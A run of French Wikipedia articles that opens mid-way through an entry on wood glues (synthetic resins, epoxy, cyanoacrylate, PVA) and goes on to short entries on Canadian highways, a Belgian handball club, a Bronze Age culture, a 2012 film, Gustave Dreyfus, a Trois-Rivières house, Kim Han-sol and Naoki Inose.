L'utilisation des colles de synthèse commence dans les années 1930 et surtout pendant la seconde Guerre Mondiale. Résistantes à l'humidité et à la pourriture, elles se prêteront à la conception de contreplaqués et dans l'aéronautique de contreplaqués moulés qui seront étanches et résistants aux attaques bactériennes. Elles feront rattraper au bois son retard sur le métal. Le contreplaqué mêlé à des adhésifs de résine améliorés va offrir aux concepteurs et aux constructeurs d'avions un matériau qui ne se fend pas, a une bonne stabilité dimensionnelle, une résistance répartie, et une facilité de mise en œuvre pour être plié, cintré et formé. Certaines structures de contreplaqué pour aviation (comme dans le procédé Durmold) seront probablement composées d'environ 80 % de bois et de 20 % de résine adhésive; de manière abusive, on leur donnera les noms de « » et de « »; à l'exception des variations de forme, le produit était essentiellement le même que le contreplaqué pressé à plat. Les premiers adhésifs employés dans l'aviation étaient les colles dérivées de protéines naturelles (colle animale et colle d'albumine sanguine principalement, par la suite colle de caséine). Plus tard sont arrivées les colles phénoliques, et dans les années 1930, les colles urée-formaldéhyde et les colles résol (résines phénoliques à durcissement alcalin). La colle de caséine, sera fréquemment utilisée ; durcie elle était un peu résistante à l'eau mais se dégradait dans des conditions humides à long terme ; elle était également sensible au mouillage et au séchage répétés et sujette aux attaques fongiques lorsqu'elle était maintenue humide ; des conservateurs furent ajoutés pour empêcher les attaques fongiques, mais l'impermanence inhérente de la colle est restée un facteur déterminant tout au long de son utilisation dans les avions. Au fur et à mesure que la chimie des polymères progressait dans les années 1930 et 1940, des adhésifs synthétiques plus solides et plus durables arrivèrent sur le marché qui commencèrent à supplanter les colles naturelles. Pour les usages domestiques, aux États-Unis, on estimait en 1947 que les deux tiers ou plus de la production de contreplaqué de sapin de Douglas étaient collée avec de la colle de soja, et donc destinés à un usage intérieur, tandis qu'un tiers était collé avec des résines phénoliques et destiné à un usage extérieur. En 1975 tous les contreplaqués étaient collés avec des adhésifs à base de résine synthétique. Les résines phénol-formaldéhyde et, dans une moindre mesure, les résines mélamine-formaldéhyde sont utilisées pour produire tous les contreplaqués de qualité extérieure. Les résines urée-formaldéhyde sont utilisées pour fabriquer pratiquement tous les panneaux intérieurs en bois dur, tandis que les résines phénoliques produisent la totalité sauf une petite partie des panneaux intérieurs en bois tendre à des fins structurelles.
Les questions de santé liées aux résines formaldéhyde se font plus tard.
Phénol formaldéhyde.
La résine phénol formaldéhyde est couramment utilisée pour fabriquer du contreplaqué. Il est durci à température et pression élevées. 
Des contreplaqués ont été liés à la bakélite dans les années 1930. C'était une des premières colles de synthèses qui a remplacé la colle de caséine dans ses applications aéronautiques. Le Tego film, une mince feuille de papier imprégnée de résine phénolique, était dans les années 1930-40 utilisée dans la fabrication de contreplaqué étanche. 
Urée-formaldéhyde.
Les adhésifs à base de résine d'urée-formaldéhyde présentent un faible coût effectif, des températures de durcissement basses, une résistance aux micro-organismes et à l'abrasion, et une couleur claire. Il ne flue pas et peut être réparé avec de l'époxy. Il peut se détériorer rapidement dans des environnements chauds et humides, libérant du formaldéhyde (un cancérigène). Fourni sous forme de fine poudre blanche qui est mélangée avec la moitié de son poids d'eau froide pour l'utilisation. L'adhésif mélangé reste utilisable environ trois heures selon la température. À condition qu'elle soit conservée au sec, la poudre non utilisée a une durée de conservation pouvant aller jusqu'à un an. L'adhésif a la capacité de combler les espaces entre les composants mal ajustés. Une marque populaire est . Dans l'aviation en bois, les colles Kaurit, en Allemagne, Beetle Cement (basée sur Kaurit) et Aerolite en Angleterre étaient connues pendant la seconde Guerre Mondiale et après. Aerolite est le seul adhésif de réparation spécifié par la Royal Air Force pour les avions en bois, et est largement utilisé à la fois pour la rénovation des premiers avions, et la construction de répliques; ceci est dû en partie à sa capacité à réparer avec succès des structures qui étaient auparavant collées avec des colles de caséine, qui laissent un substrat fort alcalin.
Plastique à base de résines aminiques.
Le terme aminoplaste désigne aussi toute la famille des résines thermodurcissables obtenues par polycondensation d'une amine (urée ou mélamine) et de formaldéhyde. On distingue 3 principales catégories : les mélamines formaldéhydes (MF ou AM), les mélamines-phénols formaldéhydes (apparentées aux phénoplastes), les urées formaldéhydes (UF). Ces résines ont pour principales caractéristiques, une grande dureté de surface, une bonne tenue à la chaleur (jusqu'à 160 °C pour certaines variétés), de grandes possibilités de coloration et de bonnes propriétés électriques. Les aminoplastes sont utilisés avec des charges pulvérulentes (cellulose, amiante ou verre), presque jamais renforcés de fibres longues.
Résorcine formaldéhyde.
La colle résine résorcine formaldéhyde est très solide et durable (résiste à l'immersion dans l'eau bouillante, les acides doux, l'eau salée, les solvants, les moisissures, les champignons, les ultraviolets, etc. ). Historiquement, c'était la colle dominante dans la fabrication de contreplaqué de qualité extérieure et la production d'avions en bois. Elle doit être mélangée avant utilisation (résine liquide et catalyseur en poudre), est toxique, et a une couleur durcie violet foncé, qui peut ne pas être acceptable dans certaines utilisations. Pendant de nombreuses années, la Federal Aviation Administration américaine (FAA) a déclaré que la résorcine était le seul adhésif connu recommandé pour les avions certifiés:
Cependant, en fait, la grande majorité des avions en bois construits au cours des dernières décennies (principalement des avions de construction amateur) utilisent à la place d'autres types d'adhésifs. (principalement des systèmes de résine époxy), qui offrent une plus grande résistance et, plus important encore, beaucoup moins de criticité dans une technique d'application parfaite. La plupart des adhésifs plus récents sont beaucoup plus tolérants aux erreurs de construction typiques (telles que de petits espaces ou des désalignements entre les pièces) que la résorcine, qui n'offre pratiquement aucune tolérance pour de telles situations de construction quotidiennes. Cela peut poser des difficultés majeures, notamment dans les assemblages complexes. La résorcine est cependant toujours utilisé par certains constructeurs / restaurateurs et est couramment utilisé dans les avions d'époque.
Polyuréthane.
La colle polyuréthane (les noms commerciaux incluent "Gorilla Glue" et "Excel" ) devient de plus en plus populaire aux États-Unis après avoir été utilisée pendant des années dans d'autres pays. Il adhère aux fibres textiles, aux métaux, aux plastiques, au verre, au sable, à la céramique et au caoutchouc, en plus du bois. Les adhésifs polyuréthanes pour bois sont normalement des pré-polymères terminés par des groupes isocyanates. Lorsqu'ils sont exposés à l'humidité, les isocyanates réagissent avec l'eau et durcissent ainsi les adhésifs. Par conséquent, les adhésifs polyuréthanes à un composant sont également appelés polyuréthanes durcissant à l'humidité. De plus, les interactions entre les polyuréthanes et les polymères du bois peuvent influencer de manière significative les performances de liaison. Les colles polyuréthanes se dilatent lorsqu'elles durcissent, améliorant l'adhérence là où l'ajustement n'est pas serré. Contrairement aux colles PVA, elles peuvent être utilisées pour coller les bois aboutés. Cependant, dans les tests de saturation en eau, les liaisons polyuréthane étaient beaucoup moins durables que les liaisons résorcine à la fois sur le douglas et le bouleau jaune. 
Époxy.
La résine époxy, généralement sous forme de système de mélange en deux parties, durcit dans une plage de températures et de teneur en humidité plus large que les autres colles, ne nécessite pas de pression pendant le durcissement et possède de bonnes propriétés de remplissage des espaces : des joints presque parfaits avec de très petits espaces produisent en fait des liens plus faibles. L'utilisation d'époxy nécessite une attention particulière au rapport de mélange des deux parties. Il adhère à la plupart des colles à bois durcies (sauf PVA). L'adhésif époxy en deux parties est très résistant à l'eau salée, la plupart des époxy résistent à la chaleur jusqu'à 177 °C, les formulations contenant du métal en poudre et du caoutchouc ou des plastifiants sont très résistantes et résistantes aux chocs. L'époxy peut déclencher une sensibilité à long terme (allergies) due à une surexposition et est souvent coûteux. 
Cyanoacrylate.
Le cyanoacrylate ("Crazy glue", "Superglue", "CA" ou "CyA" ) est utilisé principalement pour les petites réparations, notamment par les tourneurs sur bois. Il se lie instantanément, y compris à la peau. Le CA durci est essentiellement une matière plastique. Des versions sont disponibles qui sont capables de s'infiltrer dans les joints serrés mais se lient avec une résistance réduite (car beaucoup s'égoutte et s'imprègne dans le bois en laissant très peu sur la surface pour le collage), ou des formulations plus épaisses (gel) qui peuvent combler de très petits vides, ne coule pas du joint et ne pénètre pas si rapidement dans le bois. La colle cyanoacrylate plus fine ne se lie pas plus rapidement et ne forme pas de chaînes polymères plus courtes que la version gel lorsqu'elle est utilisée sur le bois. La nature chimique du bois retarde considérablement la polymérisation du cyanoacrylate. Lorsqu'il polymérise finalement dans un joint de bois, il reste suffisamment de gel pour une meilleure adhérence qu'avec la version mince. Lors de l'utilisation du gel, trop de colle affaiblira la liaison résultante. De même, si l'on applique trop peu de "superglue" fine, il ne restera presque plus de colle dans un joint de bois, ce qui entraînera une liaison faible ou aucune liaison du tout. Des versions sont également disponibles qui sont "sans danger pour la mousse" (le CA ordinaire dissout la plupart des mousses plastiques) qui sont généralement également commercialisées comme à "faible odeur" . Le cyanoacrylate est rigide mais a une faible résistance au cisaillement (fragile), ainsi la flexion normale du bois peut rompre la liaison dans certaines applications. Souvent, trop d'adhésif est appliqué, ce qui entraîne une liaison beaucoup plus faible. CA est rapidement devenu l'adhésif dominant utilisé par les constructeurs de modèles en bois de balsa, où sa résistance dépasse de loin les matériaux de base.
Acétate de polyvinyle (PVA).
L'acétate de polyvinyle (PVA), colle vinylique également connu sous le nom de « colle blanche », « hobby and craft » ou colle scolaire est non toxique, PH neutre, bon marché et facile à utiliser, et est donc le type de colle à bois le plus couramment utilisé. Les joints doivent être bien ajustés et serrés pendant le durcissement pour une résistance maximale. Les PVA restent flexibles après avoir durci, mais ils flueront sous une charge constante. Les joints précédemment collés avec du PVA peuvent être difficiles à réparer car la plupart des colles (y compris le PVA lui-même) n'adhèrent pas bien à la colle PVA durcie. Les colles PVA ne sont pas étanches, cependant les PVA de type 2 sont résistants à l'eau.
"Elmer's Glue-All", à l'origine une colle de caséine, est un exemple d'adhésif PVA disponible aux États-Unis.
Résine aliphatique.
La résine aliphatique, également connue sous le nom de "carpenter's glue" et "yellow glue", est un adhésif synthétique (dans ce cas, un composé aliphatique) de couleur jaune clair et de texture crémeuse utilisé le plus souvent pour lier des morceaux de bois. Comparé à d'autres adhésifs, il a une faible odeur et inflammabilité, une bonne force de liaison et une résistance modérée à l'humidité. Il est plus résistant à la chaleur et à l'eau que les colles blanches en acétate de polyvinyle, a une consistance plus lourde qui entraîne moins de gouttes et se fixe à des températures supérieures à 10 °C et jusqu'à 43 °C, bien qu'il soit considéré comme impropre à une utilisation en extérieur. Son temps de prise plus rapide que les colles blanches peut rendre difficile son utilisation sur des projets complexes. Il durcit en 24 heures environ et donne une ligne de colle translucide, beige pâle ou ambrée. Avant qu'il ne durcisse, il peut être nettoyé avec de l'eau du robinet (comme de la colle blanche). Contrairement à la colle blanche, sa résistance à la chaleur et sa dureté une fois durcie signifient qu'elle peut être poncée, bien qu'elle n'absorbe pas les lasures appliquées par-dessus. L'excès de résine doit être poncé ou autrement éliminé avant la lasure. Elle a moins tendance à "fluer" (glisser lors du serrage) que la colle blanche. La résine aliphatique a un profil d'utilisation similaire et une résistance ultime relative à celle du PVA. Les deux colles diffèrent par leurs caractéristiques d'adhérence avant la prise initiale, les PVA présentant plus de glissement lors de l'assemblage et la colle jaune ayant une meilleure adhérence initiale. Les marques incluent "Titebond" et "Lepage".
Ciment de contact.
Ciment de contact pour placages de bois.
Colle thermofusible.
Colle thermofusible pour usages temporaires.
Usage.
Plusieurs colles à bois ont une faible capacité de remplissage des espaces (""), ce qui signifie qu'elles pénètrent dans le bois et laissent l'espace vide, ou restent pour combler l'espace mais ont peu d'intégrité structurelle. Par conséquent, les menuisiers utilisent couramment des joints fins bien ajustés qui nécessitent étonnamment peu de colle pour maintenir de grosses pièces de bois. La plupart des colles à bois doivent être serrées pendant que la colle prend. Les résines époxy et certaines autres colles peuvent être épaissies avec des charges structurelles (ou avec des formulations plus épaisses de la résine) pour aider à combler les vides (adhésif à joint épais), mais il est préférable d'essayer de minimiser les lacunes en premier lieu afin que le problème ne soit pas résolu.
Résistance mécanique.
Le magazine américain "Fine Woodworking" a effectué plusieurs tests pour évaluer la résistance mécanique des joints de bois avec différentes colles : 
La colle PVA de type I était Titebond III, une colle étanche. L'époxy provenait du System Three. La colle PVA était la colle Elmer's Carpenter. La colle de peau liquide provenait de Old Brown Glue. La colle de peau chaude était celle de J.E. Moser. Le polyuréthane était de marque Gorilla.

</doc>
<doc id="6804974" url="https://fr.wikipedia.org/wiki?curid=6804974" title="Autoroute 103 (Nouvelle-Écosse)">
Autoroute 103 (Nouvelle-Écosse)



</doc>
<doc id="6804976" url="https://fr.wikipedia.org/wiki?curid=6804976" title="Colle blanche">
Colle blanche



</doc>
<doc id="6804977" url="https://fr.wikipedia.org/wiki?curid=6804977" title="Estudiantes Handball Club Tournai">
Estudiantes Handball Club Tournai

L’Estudiantes Handball Club Tournai, abrégé en EHC Tournai, surnommé L'Estu, est un club de handball belge, situé à Tournai en Belgique dans la Province du Hainaut.
Porteur du matricule 176, le club évolue en Division 1 pour la saison 2022-2023. C'est le troisième club hainuyer à s'être hissé à ce niveau, les deux autres étant le CSV Charleroi et SHC Mont-sur-Marchienne.
L'Estu est affilié à la LFH.
Histoire.
L’Estudiantes Handball Club Tournai, le matricule 176, a été fondé en 1974 au Collège de Kain à l’initiative de Michel Bataille, avec quelques anciens de la rhéto. Ils étaient tous passionnés par ce sport encore très peu pratiqué en province de Hainaut, le nom du club est inspiré du club de football argentin, l’Estudiantes de la Plata.
Jeunesse.
À Tournai, la formation des jeunes est une tradition, d’autant plus que le EHC Tournai est un club amateur. Cette formation commence dès l’âge de 5 ans, et se termine vers 21 ans. Celle-ci est encadrée par le staff technique du club.
Les équipes jeunes du EHC Tournai ont déjà collectionné les titres de champions du Brabant-Hainaut mais n’ont jamais remporté de titres LFH.
Nom.
Le club s’est inspiré du club de football argentin, l’Estudiantes de la Plata.
Médias.
Chaque semaine, Notélé, la chaîne de télévision locale du Hainaut Occidental, diffuse Estu Mag, proposant les meilleurs moments des rencontres sportives du EHC Tournai. Cette retransmission dure en moyenne une vingtaine de minutes.

</doc>
<doc id="6804981" url="https://fr.wikipedia.org/wiki?curid=6804981" title="Autoroute 101 (Nouvelle-Écosse)">
Autoroute 101 (Nouvelle-Écosse)



</doc>
<doc id="6804993" url="https://fr.wikipedia.org/wiki?curid=6804993" title="Culture d'Hilversum">
Culture d'Hilversum

La culture d'Hilversum est une culture archéologique de l'Âge du bronze ancien et moyen. Cette culture s'est développée dans le sud des Pays-Bas, en Belgique, et jusque dans la région des Hauts-de-France. Elle est datée entre et . Elle est associée à la culture du Wessex dans le Sud de l'Angleterre durant la même période.
Extension géographique.
La culture d'Hilversum s'est développée dans le sud des Pays-Bas, en Belgique, et jusque dans la région des Hauts-de-France.
L'aire de la culture d'Hilversum a été précédemment occupée par la culture campaniforme ( - ). Certains chercheurs, tels que James Patrick Mallory et Douglas Q. Adams, estiment que cette région aurait été le territoire d'origine de la culture campaniforme. La culture d'Hilversum est probablement l'héritière de cette dernière, ou mieux de la régionalisation hollandaise du faciès campaniforme appelé "culture campaniforme à barbelures" ( - )
Subdivisions chronologiques.
Chronologie relative.
La culture d'Hilversum est divisée en trois périodes :
Ce séquencement a été établi par l'archéologue néerlandais Willem Glasbergen dans les années 1950. Cette chronologie a été ultérieurement complétée par la dénomination HVS-1 / HVS-2 / HVS-3 par T. Anscher en 1990.
La première période est elle-même subdivisée en trois époques :
Plus récemment, la culture d'Hilversum a fait l'objet d'une subdivision concurrente en deux périodes : la première période dite , qui s'étend entre environ et , et la seconde période dite , qui est comprise entre et .
Datation absolue.
La technique de datation par le C a permis de préciser l'âge absolu de la culture d'Hilversum. Celui-ci s'étend entre et .
Cette même technique de datation a également permis d'établir une chronologie absolue des différentes phases de la culture d'Hilversum.
Caractéristiques.
Artefacts en bronze.
La culture d'Hilversum comporte des artefacts confectionnés en bronze, dont des épées de type "Plougrescant-".
Céramiques.
Le faciès céramique d'Hilversum est caractérisé par des vases à large panse et à motifs poinçonnés puis barbelés. L'ensemble céramologique d'Hilversum se distingue également par des urnes de forme biconique.
Les céramiques de la culture d'Hilversum, initialement proches, de par leurs décors, de celles de la culture campaniforme, sont marquées, dans la seconde phase (celle de Drakenstein), par une disparition des motifs poinçonnés.
Sites archéologiques.
Les sites fouillés et ayant livré des vestiges appartenant à la culture d'Hilversum comprennent notamment les tumulus du hameau de , situés dans la commune de Veldhoven ; les tumulus du hameau de Grenzweg, sur la commune de Swalmen, dans la province néerlandaise du Limbourg ; le lieu-dit d', localisé dans la commune de Jutphaas (province d'Utrecht) ; la , à Hoogeloon, dans le Brabant-Septentrional ; les tumulus du site de , localisés sur la commune de Louvain, dans le Brabant flamand ; et le , dont l'emplacement se trouve au sein de la ville d'Eersel (Brabant-du-Nord).
D'autres gisements ont livré des vestiges caractéristiques de la culture d'Hilversum, tels qu'à Braine-le-Comte, dans la province belge du Hainaut ; à Meerlo, dans le Limbourg ; à Alphen-sur-le-Rhin, en Hollande-Méridionale ; à Knegsel, dans le Brabant-Septentrional ; à Haps ; à Bergem, localité située sur la commune luxembourgeoise de Mondercange, dans le canton d'Esch-sur-Alzette ; à Hamont, dans la province belge du Limbourg ; à Bergeijk ; à Schaijk, localité située dans la commune néerlandaise de Landerd ; ou encore à Baexem, village faisant partie de la commune de Leudal.
Les tumulus du site du ont été découverts puis fouillés en 1954-1955 par Willem Glasbergen.

</doc>
<doc id="6804994" url="https://fr.wikipedia.org/wiki?curid=6804994" title="Autoroute 107 (Nouvelle-Écosse)">
Autoroute 107 (Nouvelle-Écosse)



</doc>
<doc id="6805005" url="https://fr.wikipedia.org/wiki?curid=6805005" title="4Chan">
4Chan



</doc>
<doc id="6805009" url="https://fr.wikipedia.org/wiki?curid=6805009" title="Benzoxépine">
Benzoxépine

La benzoxépine ou benzooxépine est un composé hétérocyclique bicyclique constitué d'un cycle benzénique fusionné avec celui d'oxépine et de numéro CAS (mélange des isomères). Il y a trois isomères :
C'est aussi le nom de la famille des composés chimiques partageant ces structures moléculaires comme l'oxétorone.

</doc>
<doc id="6805011" url="https://fr.wikipedia.org/wiki?curid=6805011" title="L'Air de rien (film, 2012)">
L'Air de rien (film, 2012)

L'Air de rien est un film français réalisé par Grégory Magne et Stéphane Viard (c'est leur premier long métrage) sorti en France le . Le film met en scène le chanteur de variété vedette des Michel Delpech dans son propre rôle.
Synopsis.
Michel Delpech, grande vedette de la chanson française des (jouée par Michel Delpech lui-même) qui a disparu des scènes musicales depuis des années, reste solitaire, retiré dans un coin de campagne, « bougon, sauvage et taiseux » après avoir fort mal géré son argent ; il accumule les amendes, les factures et les impôts impayés et croule sous les dettes.
Les huissiers associés Max Paturel et Grégory Morel se rendent chez lui pour estimer ses biens et prévoir la saisie de son mobilier, de sa voiture, voire de sa maison. Une coïncidence fait que, trente ans plus tôt, Grégory Morel écoutait fréquemment les succès de Michel Delpech, car son père, lui-même huissier, en était un fan inconditionnel. Grégory, apitoyé par les déboires du chanteur, ne supporte pas l'idée de saisir ses biens. Il commence alors à organiser une tournée des discothèques et des salles polyvalentes des villages auvergnats environnants afin de l’aider à rembourser ses dettes. Michel Delpech le suit docilement, bien que parfois dubitatif, sur les routes de cette improbable tournée. En fait, les fans n'ont rien oublié de leur idole et de ses tubes et l'accueillent chaleureusement en chantant ses succès avec ferveur. Grégory, passionné par l'aventure et l'esprit plein de compassion, passe tout son temps au service de Michel Delpech, se livre à des affaires illégales pour favoriser son protégé, et en oublie son métier d'huissier. Son associé, loyal et impitoyable huissier, le dénonce à la Chambre des huissiers. Grégory sera alors radié sans même un regret, car il avait au fond toujours exercé son métier à contrecœur.
Nominations.
Le film a été présenté et/ou sélectionné dans :
Grégory Montel a été sélectionné parmi les Révélations 2013 de l'Académie des Césars.
Autour du film.
Cofinancé par les régions Auvergne et Limousin, le film a été tourné dans la Creuse et le Puy-de-Dôme en cinq semaines, en septembre et , notamment :
Accueil critique.
Avec une note moyenne de 3,6 pour la critique presse sur Allociné, le film est apprécié pour son ton et sa subtilité. Par sa simplicité sincère aussi, par opposition au film similaire sorti quelques semaines plus tôt, qui déploie, lui, toute la puissance cinématographique possible (palette de , grands concerts dans des Zénith et à Bercy, effets spéciaux, déplacements aux États-Unis). Le vrai héros du film est Grégory Morel, dont on observe la compassion pour la oubliée, les subterfuges et la corruption dont il fait preuve pour obtenir les salles de concerts, et le mensonge envers son collègue huissier. La prestation de Michel Delpech et l'autodérision dont il fait preuve ici est également soulignée.

</doc>
<doc id="6805031" url="https://fr.wikipedia.org/wiki?curid=6805031" title="Golomianka">
Golomianka



</doc>
<doc id="6805033" url="https://fr.wikipedia.org/wiki?curid=6805033" title="Not for Nothin'">
Not for Nothin'

Not For Nothin‘ est un album du Dave Holland Quintet.
Description.
Enregistré en , cet album du Dave Holland Quintet suit sur la lancée du précédent, Prime Directive et présente les mêmes musiciens. Holland laisse beaucoup de place à ses solistes qui apportent tous au moins une composition au disque. Celui-ci explore le son classique du quintet teinté de rythmes complexes, d’improvisations simultanées et d’échanges entre solistes dans un cadre post-bop.

</doc>
<doc id="6805034" url="https://fr.wikipedia.org/wiki?curid=6805034" title="Golomyanka">
Golomyanka



</doc>
<doc id="6805035" url="https://fr.wikipedia.org/wiki?curid=6805035" title="Raddatz">
Raddatz



</doc>
<doc id="6805038" url="https://fr.wikipedia.org/wiki?curid=6805038" title="Radatz">
Radatz



</doc>
<doc id="6805039" url="https://fr.wikipedia.org/wiki?curid=6805039" title="Route 34 (Ontario)">
Route 34 (Ontario)

La route 34 est une route provinciale de l'Ontario reliant la ville d'Hawkesbury à l'autoroute 417 passant par Vankleek Hill. Elle est longue d'environ 17 kilomètres.
Description du tracé.
La route 34 débute à l'échangeur avec l'autoroute 417. Elle se dirige vers le nord sur en traversant la région rurale de la vallée d'Ottawa et traverse la petite communauté de Vankleek Hill.
Après avoir effectué une légère courbe vers le nord, elle croise la route de comté 17 (ancienne route 17) à un échangeur avec celle-ci. Finalement, elle contourne la ville d'Hawkesbury, principale ville de la région, par le nord-ouest, étant nommée rue McGill, boulevard du Chenail et rue John. C'est sur le pont du Long-Sault, reliant l'Ontario au Québec (Hawkesbury à Grenville), que la route 34 prend fin près de la route 344.

</doc>
<doc id="6805042" url="https://fr.wikipedia.org/wiki?curid=6805042" title="Gustave Dreyfus">
Gustave Dreyfus

Gustave Louis Dreyfus est un collectionneur d'art né à Paris le et mort dans la même ville le . 
Biographie.
Entre 1861 et 1864, il travaille en Égypte pour la création du Canal de Suez en qualité de secrétaire de l’ingénieur en chef puis chef du bureau central des travaux. 
Il réunit une importante collection d'œuvres d'art dont des marbres et des bronzes de la Renaissance italienne.
La pièce la plus connue en est "La Madone Dreyfus" provenant de la collection du peintre et historien d’art Louis Charles Timbal (1821-1880), et que ses héritiers vendirent en 1930 au célèbre marchand d'art Joseph Duveen. 
Invité chez lui, le byzantiniste et numismate Gustave Schlumberger aurait eu l'impolitesse de pointer publiquement son "incapacité à lire les légendes de ses médailles si chèrement payées"...(Pierre Assouline, "Le dernier des Camondo", 1997, p.40).
Il est fait chevalier de la Légion d'honneur en 1878.
En 1879 il publie avec Charles Ephrussi un "Catalogue descriptif des dessins de maîtres anciens exposés à l'École des beaux-arts" et fréquente aussi les milieux littéraires, notamment l'écrivain Paul Bourget et Antonin Proust.
Beaucoup de ses amis lui tournèrent le dos à l'occasion de l'affaire Dreyfus, notamment la famille Daudet dont Léon, virulent antisémite.
Gaston Migeon relate la vie de Dreyfus et donne une description de son appartement du 101, boulevard Malesherbes à Paris et de la collection qu'il contenait dans "Notice lue à l'Assemblée Générale annuelle de la Société des Amis du Louvre le " (BNF)

</doc>
<doc id="6805044" url="https://fr.wikipedia.org/wiki?curid=6805044" title="Liste des lieux patrimoniaux du district de Manitoulin">
Liste des lieux patrimoniaux du district de Manitoulin

Cet article recense les lieux patrimoniaux du district de Manitoulin inscrits au répertoire des lieux patrimoniaux du Canada, qu'ils soient de niveau provincial, fédéral ou municipal.

</doc>
<doc id="6805052" url="https://fr.wikipedia.org/wiki?curid=6805052" title="Maison Hertel-De La Fresnière">
Maison Hertel-De La Fresnière

La maison Hertel-De La Fresnière est une maison située sur la rue des Ursulines à Trois-Rivières. Elle est classée immeuble patrimonial en 1961.
Localisation.
La maison est située au 802, rue des Ursulines à Trois-Rivières. Elle est localisée dans le site patrimonial de Trois-Rivières, un site patrimonial déclaré comprenant le Vieux-Trois-Rivières. Elle fait aussi partie du complexe historique de Trois-Rivières, un lieu historique national du Canada comprenant quatre autres édifices, soit le monastère des Ursulines, l'église Saint-James ainsi que son presbytère et la maison Georges-De Gannes.
Histoire.
Joseph-François Hertel fait l'acquisition du terrain en 1668. Celui qui fut surnommé « le héros » est né à Trois-Rivières en 1642. Il commença son apprentissage comme soldat en 1657. Il est capturé par les Iroquois en juillet 1661 alors qu'il était sorti de façon imprudente de l'enceinte fortifiée. Il est emmené dans leur village, torturé et adopté par une vieille dame qui lui apprend leurs coutumes et leurs langues. Il profite deux ans plus tard de l'absence de sa protectrice pour s'évader et retourne à Trois-Rivières en , alors qu'on le prenait pour mort.
C'est au début des années 1680 qu'il fit sa renommée, le gouverneur Joseph-Antoine Le Febvre de La Barre lui confie le commandement de toutes les tribus alliées des Français. Il développa avec ses sept fils une technique d'attaque-surprise inspiré des méthodes des Amérindiens qui fut surnommée « les raids des Hertel », qui terrorisaient les bourgs frontaliers de la Nouvelle-Angleterre. En raison de sa bravoure, le gouverneur Louis de Buade de Frontenac tente de lui faire obtenir ses lettres de noblesse en 1689, mais la cour lui fait la sourde oreille. Il est finalement anobli en 1716. Il meurt en 1722 et il est enterré à Boucherville.
Le lot où est située la maison resta dans la famille des Hertel pendant plus de cent ans. Entre 1824 et 1829, le menuisier François Lafontaine y fit construire sa demeure avec l'aide de Fernand Normand, sculpteur, charpentier, menuisier et entrepreneur reconnu. La maison passa ensuite dans les mains de plusieurs propriétaires, dont des avocats, notamment le juge Joseph-Alfred Désy, un commerçant de bois, un curé, un gazier américain et les Ursulines.
La maison est classée en 1961. À la fin des années 1970, elle est achetée par la ville de Trois-Rivières. Le classement est repris en 2005 dans le but que la maison soit inscrite sur le bon lot.

</doc>
<doc id="6805053" url="https://fr.wikipedia.org/wiki?curid=6805053" title="Juin 2013">
Juin 2013

 est le de l'année 2013.

</doc>
<doc id="6805054" url="https://fr.wikipedia.org/wiki?curid=6805054" title="Janvier 2013">
Janvier 2013

 est le de l'année 2013.

</doc>
<doc id="6805055" url="https://fr.wikipedia.org/wiki?curid=6805055" title="Nouvel an Chinois">
Nouvel an Chinois



</doc>
<doc id="6805058" url="https://fr.wikipedia.org/wiki?curid=6805058" title="Kim Han-sol">
Kim Han-sol

Kim Han-sol (), né le à Pyongyang (Corée du Nord), est le fils aîné de Kim Jong-nam et le petit-fils de l'ancien dirigeant de la Corée du Nord, Kim Jong-il. Son père, Kim Jong-nam, était l'héritier présomptif de la dynastie Kim jusqu'en 2001, où il perdit la faveur du régime à cause d'un mode de vie décalé. Son oncle paternel, Kim Jong-un, a été nommé héritier en , et a succédé à son père après la mort de ce dernier en .
Biographie.
Kim Han-sol apparait pour la première fois à l'attention du public en 2011, lorsqu'il est accepté par le Li Po Chun United World College, membre du mouvement United World Colleges (UWC), pour étudier à Hong Kong. Cependant, le gouvernement de Hong Kong refuse de lui délivrer un visa étudiant.
À la fin de 2011, à la suite des annonces d'admission de l'United World College de Mostar, un campus d'UWC en Bosnie-Herzégovine, les médias sud-coréens découvrent que l'un des étudiants nouvellement admis au collège international est Kim Han-sol. Ils retracent l'activité en ligne de comptes maintenus par Kim Han-sol sur plusieurs réseaux sociaux. Le contenu de ces comptes est alors largement diffusé, montrant un contraste fort avec le régime de son grand-père. Dans des messages postés sur Youtube, Facebook et Twitter, il exprime sa culpabilité pour le rôle de sa famille dans la souffrance du peuple nord-coréen.
En , Kim Han-sol est interviewé sur la télévision publique nationale finlandaise Yle, émettant plusieurs commentaires à propos de son désir pour la réunification de la Corée, tout en critiquant les actions de son grand-père et de son oncle en Corée du Nord.
Le , Kim Han-sol est diplômé de l'UWC de Mostar en Bosnie-Herzégovine.
En , il intègre le campus euro-asiatique de l'Institut d'études politiques de Paris, au Havre. Le cursus dure 3 ans à l'issue desquels le jeune homme quitte la France pour une destination en Asie non précisée. Après l'exécution de Jang Song-taek, ancien numéro deux du régime et tuteur de Kim Jong-nam (le père de Kim Han-sol), la police française a mis en place une protection rapprochée de l'étudiant nord-coréen
Le , son père, Kim Jong-nam décède à l'aéroport international de Kuala Lumpur en Malaisie, probablement assassiné par des agents nord-coréens.

</doc>
<doc id="6805059" url="https://fr.wikipedia.org/wiki?curid=6805059" title="Naoki Inose">
Naoki Inose

, né le à Iiyama, est un journaliste, critique, essayiste et homme politique japonais. 
Il est gouverneur de Tokyo à partir du , d'abord par intérim en tant que vice-gouverneur à la suite de la démission de Shintarō Ishihara, puis élu en décembre de la même année. Pris dans un scandale financier, Inose démissionne en . Troisième écrivain successif à accéder à ce poste, après Yukio Aoshima et Shintarō Ishihara, il n'a jamais occupé d'autre charge élective.
Biographie.
Un représentant de la génération "Zenkyōtō".
Naoki Inose est orphelin de père à l'âge de trois ans et demi, son père étant décédé d'une angine en . Il grandit et fait toute sa scolarité dans sa ville natale de Nagano, dans le public, d'abord dans les établissements de la compagnie scolaire de l'Université Shinshū (université nationale) à l'école élémentaire et au collège, puis au lycée public préfectoral de Nagano dans le quartier d'Uematsu. Il complète ses études à l'école de commerce de la faculté des arts de l'université Shinshū à Matsumoto. Il y préside en 1969 la section locale de la , plus connu sous le nom de , le principal, le plus actif et le plus radical des syndicats étudiants. Ainsi, il est l'un des meneurs du mouvement étudiant à Nagano, connu nationalement comme la qui proteste à la fin des années 1960 contre la hausse des frais d'inscription, le système éducatif jugé élitiste, la signature de l'accord nippo-coréen du rétablissant des relations diplomatiques et une coopération avec la Corée du Sud autoritaire de Park Chung-hee ou la présence de soldats et de bases américaines sur le sol japonais. Il organise des blocages et des barricades dans son université et mène la délégation d'étudiants de Shinshū participant à la manifestation anti-guerre organisée dans l'arrondissement de Shinjuku à Tokyo le , puis à celles contre la visite du Premier ministre Eisaku Satō aux États-Unis les 16 